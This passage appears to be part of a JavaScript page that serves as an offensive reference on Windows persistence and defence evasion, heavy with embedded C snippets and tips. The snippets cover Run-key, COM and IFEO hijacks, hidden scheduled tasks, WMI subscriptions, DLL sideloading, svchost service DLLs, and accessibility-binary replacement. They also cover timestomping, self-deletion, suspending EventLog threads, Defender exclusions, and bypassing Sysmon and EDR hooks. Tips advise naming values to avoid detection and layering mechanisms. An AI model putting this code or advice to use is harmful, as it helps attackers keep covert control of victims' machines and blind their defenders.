+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">Direct registry</b><span style="color:#6b7280">NtSetValueKey avoids Event 7045</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">Clear specific</b><span style="color:#6b7280">wevtutil cl System (noisy)</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Patch EventLog</b><span style="color:#6b7280">Suspend EventLog service threads</span></div>');
+h+=CRD("\u{1F4C5}","Timestomping","#fb923c",
+'<div style="margin-bottom:4px">Match file timestamps to surrounding OS files. SetFileTime or NtSetInformationFile.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">$STANDARD_INFO</b><span style="color:#6b7280">SetFileTime modifies this (shown in Explorer)</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">$FILE_NAME</b><span style="color:#6b7280">Only kernel can modify. Forensic artifact.</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Match target</b><span style="color:#6b7280">Copy timestamp from kernel32.dll or ntdll.dll</span></div>');
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.reg=[
+{t:"Registry Run key persistence",l:"c",c:"void PersistRun(LPCSTR payload) {\n    HKEY hKey;\n    RegOpenKeyExA(HKEY_CURRENT_USER,\n        \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n        0, KEY_SET_VALUE, &hKey);\n    RegSetValueExA(hKey, \"WindowsUpdate\", 0, REG_SZ,\n        (BYTE*)payload, strlen(payload)+1);\n    RegCloseKey(hKey);\n}\n// HKCU = user level, no admin\n// HKLM = admin required, all users"},
+{t:"COM hijack (HKCU InprocServer32)",l:"c",c:"void COMHijack(LPCSTR clsid, LPCSTR dllPath) {\n    char subkey[256];\n    snprintf(subkey, sizeof(subkey),\n        \"Software\\\\Classes\\\\CLSID\\\\%s\\\\InprocServer32\", clsid);\n\n    HKEY hKey;\n    RegCreateKeyExA(HKEY_CURRENT_USER, subkey,\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\n    RegSetValueExA(hKey, NULL, 0, REG_SZ,\n        (BYTE*)dllPath, strlen(dllPath)+1);\n\n    LPCSTR model = \"Both\";\n    RegSetValueExA(hKey, \"ThreadingModel\", 0, REG_SZ,\n        (BYTE*)model, strlen(model)+1);\n    RegCloseKey(hKey);\n}\n\n// Find target CLSIDs with Process Monitor:\n// Filter: RegOpenKey, HKCR\\\\CLSID, NAME NOT FOUND\n// Good targets: CLSIDs loaded by explorer.exe"},
+{t:"IFEO debugger persistence",l:"c",c:"void IFEOPersist(LPCSTR target, LPCSTR payload) {\n    char subkey[256];\n    snprintf(subkey, sizeof(subkey),\n        \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\"\n        \"\\\\Image File Execution Options\\\\%s\", target);\n\n    HKEY hKey;\n    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey,\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\n    RegSetValueExA(hKey, \"Debugger\", 0, REG_SZ,\n        (BYTE*)payload, strlen(payload)+1);\n    RegCloseKey(hKey);\n}\n// When target.exe launches, Windows runs:\n// payload.exe target.exe [original args]\n// Your payload gets target path as argv[1]"},
+{t:"Screensaver persistence",l:"c",c:"void ScreensaverPersist(LPCSTR payload) {\n    HKEY hKey;\n    RegOpenKeyExA(HKEY_CURRENT_USER,\n        \"Control Panel\\\\Desktop\", 0, KEY_SET_VALUE, &hKey);\n    RegSetValueExA(hKey, \"SCRNSAVE.EXE\", 0, REG_SZ,\n        (BYTE*)payload, strlen(payload)+1);\n    RegSetValueExA(hKey, \"ScreenSaveActive\", 0, REG_SZ,\n        (BYTE*)\"1\", 2);\n    RegSetValueExA(hKey, \"ScreenSaveTimeOut\", 0, REG_SZ,\n        (BYTE*)\"60\", 3); // seconds\n    RegCloseKey(hKey);\n}\n// User-level, no admin. Fires after 60s idle.\n// .scr files are just renamed .exe"}
+];
+C.tsk=[
+{t:"Scheduled task via COM (stealthy)",l:"c",c:"// COM API avoids schtasks.exe process creation\n#include <taskschd.h>\n#pragma comment(lib, \"taskschd.lib\")\n\nvoid CreateTaskCOM(LPCWSTR name, LPCWSTR exe) {\n    CoInitializeEx(NULL, COINIT_MULTITHREADED);\n    ITaskService *pSvc = NULL;\n    CoCreateInstance(CLSID_TaskScheduler, NULL,\n        CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pSvc);\n    pSvc->Connect(_variant_t(), _variant_t(),\n        _variant_t(), _variant_t());\n\n    ITaskFolder *pRoot = NULL;\n    pSvc->GetFolder(_bstr_t(L\"\\\\\"), &pRoot);\n\n    ITaskDefinition *pTask = NULL;\n    pSvc->NewTask(0, &pTask);\n\n    // Trigger: at logon\n    ITriggerCollection *pTrigs; pTask->get_Triggers(&pTrigs);\n    ITrigger *pTrig; pTrigs->Create(TASK_TRIGGER_LOGON, &pTrig);\n\n    // Action: run exe\n    IActionCollection *pActs; pTask->get_Actions(&pActs);\n    IAction *pAct; pActs->Create(TASK_ACTION_EXEC, &pAct);\n    IExecAction *pExec; pAct->QueryInterface(IID_IExecAction,\n        (void**)&pExec);\n    pExec->put_Path(_bstr_t(exe));\n\n    pRoot->RegisterTaskDefinition(_bstr_t(name), pTask,\n        TASK_CREATE_OR_UPDATE, _variant_t(),\n        _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN,\n        _variant_t(L\"\"), NULL);\n    CoUninitialize();\n}"},
+{t:"schtasks.exe one-liner",l:"c",c:"// Quick but noisy - creates process, logged by Sysmon\nsystem(\"schtasks /create /tn \\\"WindowsUpdate\\\" \"\n    \"/tr \\\"C:\\\\Users\\\\Public\\\\update.exe\\\" \"\n    \"/sc onlogon /rl highest /f\");\n\n// Variants:\n// /sc onstart     - at boot (SYSTEM)\n// /sc minute /mo 5 - every 5 minutes\n// /sc onidle      - when idle\n// /ru SYSTEM      - run as SYSTEM (admin req)"},
+{t:"Hidden scheduled task (SD tamper)",l:"c",c:"// After creating task, modify its security descriptor\n// to deny read access. Task becomes invisible to\n// schtasks /query and Task Scheduler GUI.\n\n// Task XML stored in:\n// C:\\\\Windows\\\\System32\\\\Tasks\\\\TaskName\n\n// Registry key:\n// HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\\n//   CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree\\\\TaskName\n// Set SD value to deny read:\n// D:(D;;GA;;;BU)(A;;GA;;;SY)(A;;GA;;;BA)\n// D = deny GA (GenericAll) to BU (BuiltinUsers)\n\n// Or delete the Tree registry entry entirely\n// (task still runs, just invisible to enumeration tools)\nRegDeleteKeyA(HKEY_LOCAL_MACHINE,\n    \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\"\n    \"\\\\Schedule\\\\TaskCache\\\\Tree\\\\TaskName\");"}
+];
+C.wmi=[
+{t:"WMI event subscription (full)",l:"c",c:"// Create all three components via COM\n#include <wbemcli.h>\n#pragma comment(lib, \"wbemuuid.lib\")\n\nvoid WMIPersist(LPCWSTR cmd) {\n    CoInitializeEx(0, COINIT_MULTITHREADED);\n    IWbemLocator *pLoc = NULL;\n    CoCreateInstance(CLSID_WbemLocator, 0,\n        CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pLoc);\n    IWbemServices *pSvc = NULL;\n    pLoc->ConnectServer(_bstr_t(L\"ROOT\\\\SUBSCRIPTION\"),\n        NULL, NULL, 0, 0, 0, 0, &pSvc);\n    CoSetProxyBlanket(pSvc, 10, 0, NULL, 3, 3, NULL, 0);\n\n    // 1. Event Filter\n    IWbemClassObject *pFilterClass, *pFilter;\n    pSvc->GetObject(_bstr_t(L\"__EventFilter\"),\n        0, NULL, &pFilterClass, NULL);\n    pFilterClass->SpawnInstance(0, &pFilter);\n    // Set Name, QueryLanguage=\"WQL\", Query\n    // Query: \"SELECT * FROM __InstanceModificationEvent\n    //   WITHIN 60 WHERE TargetInstance ISA\n    //   'Win32_PerfFormattedData_PerfOS_System'\"\n    pSvc->PutInstance(pFilter, 0, NULL, NULL);\n\n    // 2. CommandLine Consumer\n    IWbemClassObject *pConsClass, *pCons;\n    pSvc->GetObject(_bstr_t(L\"CommandLineEventConsumer\"),\n        0, NULL, &pConsClass, NULL);\n    pConsClass->SpawnInstance(0, &pCons);\n    // Set Name, CommandLineTemplate = cmd\n    pSvc->PutInstance(pCons, 0, NULL, NULL);\n\n    // 3. Binding\n    IWbemClassObject *pBindClass, *pBind;\n    pSvc->GetObject(_bstr_t(L\"__FilterToConsumerBinding\"),\n        0, NULL, &pBindClass, NULL);\n    pBindClass->SpawnInstance(0, &pBind);\n    // Set Filter ref, Consumer ref\n    pSvc->PutInstance(pBind, 0, NULL, NULL);\n}"},
+{t:"WMI persistence via PowerShell",l:"c",c:"// PowerShell one-liner (for reference)\n// $filter = Set-WmiInstance -Class __EventFilter\n//   -Namespace root\\\\subscription\n//   -Arguments @{\n//     Name = 'MyFilter';\n//     QueryLanguage = 'WQL';\n//     Query = 'SELECT * FROM __InstanceModificationEvent\n//       WITHIN 60 WHERE TargetInstance ISA\n//       \"Win32_PerfFormattedData_PerfOS_System\"'\n//   }\n//\n// $consumer = Set-WmiInstance\n//   -Class CommandLineEventConsumer\n//   -Namespace root\\\\subscription\n//   -Arguments @{\n//     Name = 'MyConsumer';\n//     CommandLineTemplate = 'C:\\\\payload.exe'\n//   }\n//\n// Set-WmiInstance -Class __FilterToConsumerBinding\n//   -Namespace root\\\\subscription\n//   -Arguments @{\n//     Filter = $filter;\n//     Consumer = $consumer\n//   }"}
+];
+C.dll=[
+{t:"DLL search order hijack",l:"c",c:"// 1. Find vulnerable app with Process Monitor:\n//    Filter: Operation=CreateFile, Result=NAME NOT FOUND,\n//    Path contains .dll\n//\n// 2. Create proxy DLL that forwards to original:\n//    #pragma comment(linker, \"/export:DllFunc=orig.DllFunc\")\n//\n// 3. Drop in application directory (higher search priority)\n\n// Proxy DLL template:\nBOOL WINAPI DllMain(HMODULE hMod, DWORD reason, LPVOID) {\n    if (reason == DLL_PROCESS_ATTACH) {\n        DisableThreadLibraryCalls(hMod);\n        // Load real DLL from System32\n        LoadLibraryA(\"C:\\\\Windows\\\\System32\\\\real.dll\");\n        // Run payload in background\n        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);\n    }\n    return TRUE;\n}"},
+{t:"Phantom DLL (supply missing DLL)",l:"c",c:"// Many apps try to load DLLs that don't exist\n// Supply the DLL and get code execution\n\n// Common phantoms (check with ProcMon):\n// - wtsapi32.dll (many services)\n// - version.dll  (many apps)\n// - dbghelp.dll  (dev tools)\n// - MSASN1.dll   (crypto apps)\n// - userenv.dll  (shell extensions)\n\n// Your phantom DLL exports nothing special:\nBOOL WINAPI DllMain(HMODULE h, DWORD r, LPVOID) {\n    if (r == DLL_PROCESS_ATTACH) {\n        DisableThreadLibraryCalls(h);\n        CreateThread(NULL, 0, Payload, NULL, 0, NULL);\n    }\n    return TRUE;\n}\n// Drop in app directory or writable PATH dir\n// App loads it on next launch = persistence"}
+];
+C.boo=[
+{t:"Startup folder (.lnk creation)",l:"c",c:"#include <shobjidl.h>\nvoid StartupLnk(LPCWSTR target, LPCWSTR name) {\n    CoInitialize(NULL);\n    IShellLinkW *pSL;\n    CoCreateInstance(CLSID_ShellLink, NULL,\n        CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pSL);\n    pSL->SetPath(target);\n    pSL->SetWorkingDirectory(L\"C:\\\\Users\\\\Public\");\n\n    IPersistFile *pPF;\n    pSL->QueryInterface(IID_IPersistFile, (void**)&pPF);\n\n    WCHAR path[MAX_PATH];\n    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path);\n    wcscat(path, L\"\\\\\"); wcscat(path, name);\n    wcscat(path, L\".lnk\");\n    pPF->Save(path, TRUE);\n    pPF->Release(); pSL->Release();\n    CoUninitialize();\n}"},
+{t:"Accessibility feature replacement",l:"c",c:"// Replace sethc.exe with cmd.exe for lock screen access\n// Requires admin + ownership change\n\n// Take ownership:\n// takeown /f C:\\\\Windows\\\\System32\\\\sethc.exe\n// icacls C:\\\\Windows\\\\System32\\\\sethc.exe /grant admin:F\n// copy C:\\\\Windows\\\\System32\\\\cmd.exe\n//      C:\\\\Windows\\\\System32\\\\sethc.exe /Y\n\n// Programmatic:\nvoid ReplaceAccessibility(LPCSTR target, LPCSTR payload) {\n    char sys32[MAX_PATH];\n    GetSystemDirectoryA(sys32, MAX_PATH);\n    char src[MAX_PATH], dst[MAX_PATH];\n    snprintf(dst, MAX_PATH, \"%s\\\\%s\", sys32, target);\n    // Take ownership via SetNamedSecurityInfo\n    // Then CopyFile\n    CopyFileA(payload, dst, FALSE);\n}\n// 5x Shift at lock screen -> SYSTEM cmd.exe"},
+{t:"Active Setup persistence",l:"c",c:"void ActiveSetup(LPCSTR guid, LPCSTR payload) {\n    char subkey[256];\n    snprintf(subkey, sizeof(subkey),\n        \"SOFTWARE\\\\Microsoft\\\\Active Setup\"\n        \"\\\\Installed Components\\\\%s\", guid);\n    HKEY hKey;\n    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey,\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\n    RegSetValueExA(hKey, \"StubPath\", 0, REG_SZ,\n        (BYTE*)payload, strlen(payload)+1);\n    // Version: increment to re-trigger per user\n    RegSetValueExA(hKey, \"Version\", 0, REG_SZ,\n        (BYTE*)\"1,0,0,1\", 8);\n    RegCloseKey(hKey);\n}\n// Runs StubPath once per user on logon\n// If version increments, runs again for all users"}
+];
+C.svc=[
+{t:"Create service (sc.exe equivalent)",l:"c",c:"void CreateSvc(LPCSTR name, LPCSTR binPath) {\n    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL,\n        SC_MANAGER_CREATE_SERVICE);\n    SC_HANDLE hSvc = CreateServiceA(hSCM, name, name,\n        SERVICE_ALL_ACCESS,\n        SERVICE_WIN32_OWN_PROCESS,\n        SERVICE_AUTO_START,\n        SERVICE_ERROR_NORMAL,\n        binPath, NULL, NULL, NULL, NULL, NULL);\n    StartServiceA(hSvc, 0, NULL);\n    CloseServiceHandle(hSvc);\n    CloseServiceHandle(hSCM);\n}\n// Event 7045 logged in System log\n// Visible in services.msc and Autoruns"},
+{t:"Service DLL in svchost (stealthy)",l:"c",c:"// Register DLL as svchost service\n// Runs inside svchost.exe = blends with legit services\n\nvoid SvchostDllPersist(LPCSTR name, LPCSTR dllPath) {\n    // 1. Create service key\n    char svcKey[256];\n    snprintf(svcKey, 256,\n        \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\%s\", name);\n    HKEY hKey;\n    RegCreateKeyExA(HKEY_LOCAL_MACHINE, svcKey,\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\n\n    DWORD type = 0x20; // SERVICE_WIN32_SHARE_PROCESS\n    RegSetValueExA(hKey, \"Type\", 0, REG_DWORD,\n        (BYTE*)&type, 4);\n    DWORD start = 2; // SERVICE_AUTO_START\n    RegSetValueExA(hKey, \"Start\", 0, REG_DWORD,\n        (BYTE*)&start, 4);\n    LPCSTR img = \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\";\n    RegSetValueExA(hKey, \"ImagePath\", 0, REG_EXPAND_SZ,\n        (BYTE*)img, strlen(img)+1);\n\n    // 2. Parameters\\\\ServiceDll\n    HKEY hParam;\n    RegCreateKeyExA(hKey, \"Parameters\",\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hParam, NULL);\n    RegSetValueExA(hParam, \"ServiceDll\", 0, REG_EXPAND_SZ,\n        (BYTE*)dllPath, strlen(dllPath)+1);\n    RegCloseKey(hParam);\n    RegCloseKey(hKey);\n\n    // 3. Add to svchost group\n    // HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\\n    //   CurrentVersion\\\\Svchost\\\\netsvcs\n    // Append service name to REG_MULTI_SZ\n}"},
+{t:"Modify existing dormant service",l:"c",c:"// Change binPath of unused service (no Event 7045)\nSC_HANDLE hSCM = OpenSCManagerA(NULL, NULL,\n    SC_MANAGER_ALL_ACCESS);\nSC_HANDLE hSvc = OpenServiceA(hSCM,\n    \"wercplsupport\", // Windows Error Reporting (often disabled)\n    SERVICE_CHANGE_CONFIG | SERVICE_START);\n\nChangeServiceConfigA(hSvc,\n    SERVICE_NO_CHANGE,\n    SERVICE_AUTO_START,  // enable auto-start\n    SERVICE_NO_CHANGE,\n    \"C:\\\\Users\\\\Public\\\\payload.exe\", // new binPath\n    NULL, NULL, NULL, NULL, NULL, NULL);\n\nStartServiceA(hSvc, 0, NULL);\n// No service creation event logged\n// Appears as existing service in Autoruns"}
+];
+C.adv=[
+{t:"AppDomainManager injection",l:"c",c:"// Create config file next to any .NET exe:\n// app.exe.config (or machine.config for global)\n\n// Content of app.exe.config:\n// <?xml version=\"1.0\"?>\n// <configuration>\n//   <runtime>\n//     <appDomainManagerAssembly\n//       value=\"Payload, Version=1.0.0.0,\n//              Culture=neutral,\n//              PublicKeyToken=null\" />\n//     <appDomainManagerType\n//       value=\"PayloadManager\" />\n//   </runtime>\n// </configuration>\n\n// Payload.dll (C#):\n// public class PayloadManager : AppDomainManager {\n//     public override void InitializeNewDomain(\n//         AppDomainSetup info) {\n//         // Code runs when .NET app starts\n//         System.Diagnostics.Process.Start(\"calc.exe\");\n//     }\n// }\n\n// Drop Payload.dll next to target .NET app\n// No registry. No admin. Config-based."},
+{t:"Print Monitor DLL persistence",l:"c",c:"void PrintMonPersist(LPCSTR dllPath) {\n    HKEY hKey;\n    RegCreateKeyExA(HKEY_LOCAL_MACHINE,\n        \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\"\n        \"\\\\Monitors\\\\MyMonitor\",\n        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\n    RegSetValueExA(hKey, \"Driver\", 0, REG_SZ,\n        (BYTE*)dllPath, strlen(dllPath)+1);\n    RegCloseKey(hKey);\n}\n// DLL loaded by spoolsv.exe (Spooler service)\n// Runs as SYSTEM at boot\n// DLL must export: InitializePrintMonitor2"},
+{t:"Netsh helper DLL",l:"c",c:"void NetshPersist(LPCSTR dllPath) {\n    HKEY hKey;\n    RegOpenKeyExA(HKEY_LOCAL_MACHINE,\n        \"SOFTWARE\\\\Microsoft\\\\NetSh\",\n        0, KEY_SET_VALUE, &hKey);\n    RegSetValueExA(hKey, \"MyHelper\", 0, REG_SZ,\n        (BYTE*)dllPath, strlen(dllPath)+1);\n    RegCloseKey(hKey);\n}\n// DLL loaded every time netsh.exe runs\n// GP refresh, network scripts trigger netsh\n// DLL must export: InitHelperDll"}
+];
+C.kit=[
+{t:"Timestomping (match OS files)",l:"c",c:"void Timestomp(LPCSTR target, LPCSTR reference) {\n    // Copy timestamps from reference file\n    HANDLE hRef = CreateFileA(reference, GENERIC_READ,\n        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n    FILETIME ct, at, wt;\n    GetFileTime(hRef, &ct, &at, &wt);\n    CloseHandle(hRef);\n\n    HANDLE hTgt = CreateFileA(target, FILE_WRITE_ATTRIBUTES,\n        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n    SetFileTime(hTgt, &ct, &at, &wt);\n    CloseHandle(hTgt);\n}\n\n// Usage: match kernel32.dll timestamps\nTimestomp(\"C:\\\\Users\\\\Public\\\\payload.dll\",\n    \"C:\\\\Windows\\\\System32\\\\kernel32.dll\");\n// Note: $FILE_NAME timestamp in MFT unchanged\n// Only $STANDARD_INFORMATION modified"},
+{t:"Registry timestamp via NtSetValueKey",l:"c",c:"// Direct NT API avoids some Sysmon detection\ntypedef NTSTATUS(NTAPI* NtSetValueKey_t)(\n    HANDLE KeyHandle, PUNICODE_STRING ValueName,\n    ULONG TitleIndex, ULONG Type,\n    PVOID Data, ULONG DataSize);\n\nvoid StealthRegSet(HKEY root, LPCWSTR subkey,\n    LPCWSTR valueName, LPCSTR data) {\n    HKEY hKey;\n    RegOpenKeyExW(root, subkey, 0, KEY_SET_VALUE, &hKey);\n\n    NtSetValueKey_t pNtSet = (NtSetValueKey_t)\n        GetProcAddress(GetModuleHandleA(\"ntdll.dll\"),\n        \"NtSetValueKey\");\n\n    UNICODE_STRING us;\n    RtlInitUnicodeString(&us, valueName);\n    pNtSet(hKey, &us, 0, REG_SZ, (PVOID)data,\n        (strlen(data)+1)*sizeof(WCHAR));\n    RegCloseKey(hKey);\n}\n// Some EDRs only hook RegSetValueEx, not NtSetValueKey"},
+{t:"Cleanup routine",l:"c",c:"void Cleanup(void) {\n    // 1. Remove registry persistence\n    RegDeleteValueA(HKEY_CURRENT_USER,\n        \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n        \"MyValue\");\n\n    // 2. Remove scheduled task\n    system(\"schtasks /delete /tn \\\"TaskName\\\" /f\");\n\n    // 3. Remove WMI subscription\n    // Get-WmiObject __FilterToConsumerBinding\n    //   -Namespace root\\\\subscription | Remove-WmiObject\n    // Get-WmiObject CommandLineEventConsumer\n    //   -Namespace root\\\\subscription | Remove-WmiObject\n    // Get-WmiObject __EventFilter\n    //   -Namespace root\\\\subscription | Remove-WmiObject\n\n    // 4. Self-delete\n    // cmd /c ping localhost -n 2 & del /f payload.exe\n    char cmd[512];\n    GetModuleFileNameA(NULL, cmd, sizeof(cmd));\n    char del[600];\n    snprintf(del, 600,\n        \"cmd /c ping localhost -n 2 > nul & del /f \\\"%s\\\"\", cmd);\n    system(del);\n}"}
+];
+C.byp=[
+{t:"Evade Sysmon registry monitoring",l:"c",c:"// Sysmon Event 12/13 monitors registry changes\n// Technique: Use NtSetValueKey via syscall\n// Or: temporarily rename the target key\n\n// Alt: Write to registry hive file directly\n// Reg hives: C:\\\\Windows\\\\System32\\\\config\\\\\n// SYSTEM, SOFTWARE, SAM, SECURITY\n// Parse hive format, modify offline, reload\n\n// Alt: Use transaction-based registry writes\n// NtCreateTransaction + RegOpenKeyTransacted\n// Modify + commit in single transaction\n// Some Sysmon configs miss transacted writes"},
+{t:"Suspend EventLog service threads",l:"c",c:"// Kill logging without stopping service (would alert)\n// Enumerate threads of svchost.exe hosting EventLog\n// Suspend each thread -> events queue but never flush\n\nvoid BlindEventLog(void) {\n    // 1. Find EventLog service PID\n    //    SC_HANDLE + QueryServiceStatusEx\n    // 2. Enumerate threads in that process\n    //    CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)\n    // 3. Suspend each thread\n    //    OpenThread + SuspendThread\n\n    // On cleanup: ResumeThread all\n    // Events generated during suspension are lost\n    // Service appears running to SCM\n}"},
+{t:"Defender exclusion path",l:"c",c:"// Add exclusion via PowerShell (admin required)\n// Set-MpPreference -ExclusionPath \"C:\\\\Users\\\\Public\"\n\n// Via registry (survives tamper protection sometimes):\nHKEY hKey;\nRegCreateKeyExA(HKEY_LOCAL_MACHINE,\n    \"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths\",\n    0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);\nDWORD val = 0;\nRegSetValueExA(hKey, \"C:\\\\Users\\\\Public\", 0, REG_DWORD,\n    (BYTE*)&val, sizeof(val));\nRegCloseKey(hKey);\n\n// Drop payloads in excluded path\n// Note: Tamper Protection may revert this"},
+{t:"Timestomp via NtSetInformationFile",l:"c",c:"typedef NTSTATUS(NTAPI* NtSetInformationFile_t)(\n    HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);\n\nvoid NtTimestomp(LPCSTR file, PLARGE_INTEGER time) {\n    HANDLE hFile = CreateFileA(file, FILE_WRITE_ATTRIBUTES,\n        0, NULL, OPEN_EXISTING, 0, NULL);\n\n    // FILE_BASIC_INFORMATION = class 4\n    typedef struct {\n        LARGE_INTEGER CreationTime;\n        LARGE_INTEGER LastAccessTime;\n        LARGE_INTEGER LastWriteTime;\n        LARGE_INTEGER ChangeTime;\n        ULONG FileAttributes;\n    } FILE_BASIC_INFO;\n\n    FILE_BASIC_INFO fbi = {0};\n    fbi.CreationTime = *time;\n    fbi.LastAccessTime = *time;\n    fbi.LastWriteTime = *time;\n    fbi.ChangeTime = *time;\n\n    IO_STATUS_BLOCK iosb;\n    NtSetInformationFile_t pNt = (NtSetInformationFile_t)\n        GetProcAddress(GetModuleHandleA(\"ntdll.dll\"),\n        \"NtSetInformationFile\");\n    pNt(hFile, &iosb, &fbi, sizeof(fbi), 4);\n    CloseHandle(hFile);\n}"}
+];
+return C[s]||[];
+}
+var TR={
+reg:[
+{t:"HKCU overrides HKLM for COM",d:"COM object resolution checks HKCU\\Software\\Classes\\CLSID first. User-level write overrides machine-level. No admin needed."},
+{t:"Run key naming matters",d:"Name your value something plausible: 'SecurityHealthSystray', 'OneDriveSync', 'WindowsDefenderUpdate'. Generic names get flagged."},
+{t:"REG_EXPAND_SZ for indirection",d:"Use %USERPROFILE%\\path or %APPDATA%\\path instead of absolute paths. Harder to static-match in YARA rules."},
+{t:"IFEO + SilentProcessExit combo",d:"Set IFEO debugger on target + SilentProcessExit monitor. Get notified when target exits, re-establish persistence."}
+],
+tsk:[
+{t:"COM API over schtasks.exe",d:"schtasks.exe spawns a visible process logged by Sysmon (Event 1). COM API (ITaskService) has no process creation artifact."},
+{t:"Hidden tasks via SD manipulation",d:"Modify security descriptor on task registry key to deny read. Task runs but is invisible to enumeration tools and Task Scheduler GUI."},
+{t:"TASK_LOGON_S4U for stealth",d:"S4U (Service for User) logon type doesn't require stored password and doesn't generate interactive logon events."},
+{t:"Task in subfolder",d:"Create task in \\Microsoft\\Windows\\MyFolder\\. Deeper paths are less commonly checked by hunters."}
+],
+wmi:[
+{t:"WMI survives in repository",d:"Stored in OBJECTS.DATA, not registry. Many cleanup scripts miss WMI. Get-WmiObject __FilterToConsumerBinding is the check."},
+{t:"WITHIN interval matters",d:"WITHIN 60 = check every 60 seconds. Higher = less CPU but longer delay. Lower = faster trigger but more suspicious polling."},
+{t:"ActiveScriptEventConsumer for flexibility",d:"VBScript/JScript consumer supports complex logic without dropping separate executables. Script stored in WMI repository."},
+{t:"Process start trigger",d:"Win32_ProcessStartTrace as filter triggers when specific process starts. Good for targeting specific apps."}
+],
+dll:[
+{t:"Proxy DLL maintains functionality",d:"Forward all original exports to real DLL. App works normally while your code runs alongside. Use #pragma comment(linker, /export:)."},
+{t:"Phantom DLLs are zero-footprint",d:"No file replaced, no registry changed. You're supplying something that was missing. Cleanest persistence method."},
+{t:"Signed binary + sideload",d:"Copy signed .exe to writable dir with your DLL. Execution happens under signed process. AppLocker/WDAC may allow it."},
+{t:"Version.dll is a universal phantom",d:"Almost every GUI app loads version.dll. Very broad targeting but high risk of conflicts."}
+],
+boo:[
+{t:"Startup folder is checked first",d:"Every security tool and Autoruns checks startup folder. Use only as decoy or in combination with stealthier methods."},
+{t:"Append to Userinit, don't replace Shell",d:"Replacing Shell (explorer.exe) breaks the desktop. Appending to Userinit is safer: 'userinit.exe, payload.exe'."},
+{t:"Active Setup re-triggers on version bump",d:"Increment Version value to re-run StubPath for all users. Good for re-establishing persistence after cleanup."},
+{t:"UserInitMmprLogonScript is under-monitored",d:"HKCU\\Environment\\UserInitMmprLogonScript runs at logon. Less checked than Run keys. Single user scope."}
+],
+svc:[
+{t:"Modify existing > create new",d:"Modifying a dormant service avoids Event 7045 (service creation). Find disabled services with 'sc query state= all'."},
+{t:"Service DLL in svchost is gold",d:"Process is svchost.exe (legitimate). DLL loaded internally. Service name appears in service list but execution looks normal."},
+{t:"Direct registry avoids SCM logging",d:"Writing to HKLM\\SYSTEM\\CurrentControlSet\\Services\\X directly with NtSetValueKey avoids some SCM audit events."},
+{t:"Service recovery options for persistence",d:"Set FailureActions to restart on failure. If service killed, Windows restarts it automatically."}
+],
+adv:[
+{t:"AppDomainManager = zero registry footprint",d:"Pure config file. No registry entries, no service, no scheduled task. Only a DLL and a .config file next to the target app."},
+{t:"COM hijack: pick stable CLSIDs",d:"Choose CLSIDs loaded by explorer.exe on every logon. Use Process Monitor to identify. Avoid CLSIDs that change between Windows versions."},
+{t:"Print Monitor runs as SYSTEM",d:"spoolsv.exe loads monitor DLLs at boot as SYSTEM. Less monitored than services. Requires InitializePrintMonitor2 export."},
+{t:"Office template for user targeting",d:"Normal.dotm modified with VBA triggers every time user opens Word. Very targeted but AMSI scans VBA macros."}
+],
+kit:[
+{t:"Layer multiple mechanisms",d:"Don't rely on single persistence. Use COM hijack (user-level) + service DLL (admin) + WMI (backup). Each survives different cleanup."},
+{t:"Match timestamps to OS install",d:"Timestomp payload files to match kernel32.dll or ntdll.dll. Files with recent timestamps in System32 stand out."},
+{t:"Self-delete and re-create pattern",d:"Payload deletes its persistence, runs task, re-creates persistence on exit. Minimizes time window for detection."},
+{t:"Avoid common payload paths",d:"Don't use C:\\Temp, C:\\Users\\Public, %APPDATA%\\Temp. Create path that looks like legitimate app: C:\\ProgramData\\Microsoft\\..."}
+],
+byp:[
+{t:"Sysmon transacted registry writes",d:"Some Sysmon configs miss registry changes done via RegOpenKeyTransacted + NtCommitTransaction. Worth testing."},
+{t:"EventLog thread suspension",d:"Suspend svchost.exe threads hosting EventLog service. Events queue but never persist. Service appears running to SCM."},
